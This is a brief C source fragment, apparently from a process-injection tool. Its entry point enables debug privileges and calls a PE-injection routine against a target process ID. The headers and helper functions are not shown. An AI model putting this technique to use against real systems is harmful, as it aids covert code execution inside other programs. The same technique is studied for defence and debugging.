#include "hackProc.h"
/**
 * Module entry point when started by system.
 * Do not use any runtime library function before injection is complete.
 */
void entryPoint( pid_t pid )
{
  EnableDebugPrivileges();// Attempt to acquire debugging privileges
  peInjection( pid, entryThread );
}
